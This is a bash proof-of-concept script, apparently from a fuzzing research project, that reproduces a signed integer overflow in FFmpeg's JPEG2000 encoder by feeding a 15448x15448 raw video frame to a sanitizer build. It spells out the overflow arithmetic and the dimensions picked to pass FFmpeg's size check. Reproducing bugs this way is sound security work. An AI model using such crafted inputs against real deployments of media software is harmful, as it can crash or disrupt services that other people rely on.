#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"
BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

# Step 1: Generate placeholder TIFF (for documentation)
python3 vuln_001_gen.py

# Step 2: Trigger the integer overflow vulnerability in j2kenc.c line 1482.
#
# Vulnerability: avctx->width * avctx->height * 9 + FF_INPUT_BUFFER_MIN_SIZE
# is computed in signed int32. With width=15448, height=15448:
#   15448 * 15448 = 238,640,704 pixels
#   238,640,704 * 9 = 2,147,766,336 > INT32_MAX (2,147,483,647)
#   -> Signed integer overflow (CWE-190)!
#   -> UBSan reports: "signed integer overflow: 238640704 * 9 cannot be represented in type 'int'"
#   -> Negative result (-2,147,184,576 + 16384) causes ff_alloc_packet to return AVERROR(EINVAL)
#   -> Demonstrates: buffer size underestimation that would lead to CWE-122 without safety checks
#
# Dimensions chosen so that:
#   - Pass FFmpeg's image size check: (8*15448+1024)*(15448+128) = 1,940,894,208 < INT_MAX ✓
#   - Trigger int32 overflow: 15448*15448*9 = 2,147,766,336 > INT32_MAX ✓
#   - With large tiles (32768x32768): only 1 tile = faster init
#
# NOTE: This test requires ~55-65 seconds to complete due to ASAN overhead
# on the JPEG2000 codec init for a 238M-pixel image.
# The 60-second timeout may be tight; run with timeout 90 for reliable capture.

echo "[*] Running FFmpeg: rawvideo 15448x15448 -> jpeg2000 (ASAN+UBSan build)..."
echo "[*] Overflow trigger: 15448*15448*9 = 2,147,766,336 > INT32_MAX"
echo "[*] Expected UBSan: j2kenc.c:1482:70: runtime error: signed integer overflow"

ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" \
    -probesize 32 \
    -f rawvideo \
    -video_size 15448x15448 \
    -pixel_format gray8 \
    -framerate 1 \
    -i /dev/zero \
    -c:v jpeg2000 \
    -tile_width 32768 \
    -tile_height 32768 \
    -frames:v 1 \
    -f null - > vuln_001_result.txt 2>&1 || true

# Collect ASAN logs if any
cat asan.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "[*] Done. Results in vuln_001_result.txt"
